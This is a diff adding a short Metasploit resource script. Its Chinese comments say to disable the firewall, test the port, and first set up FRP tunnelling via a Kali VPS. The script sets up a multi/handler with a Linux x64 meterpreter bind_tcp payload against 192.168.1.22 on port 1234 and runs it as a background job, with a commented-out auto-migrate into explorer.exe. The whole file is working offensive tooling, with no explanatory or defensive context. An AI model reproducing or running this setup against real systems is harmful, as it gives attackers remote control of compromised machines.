@@ -1,0 +1,8 @@
+# 关防火墙 测试端口是否能通
+# 先开启kali frp vps 穿透
+use exploit/multi/handler 
+set payload linux/x64/meterpreter/bind_tcp
+set rhost 192.168.1.22
+set lport 1234
+# set autorunscript migrate -n explorer.exe
+run -j
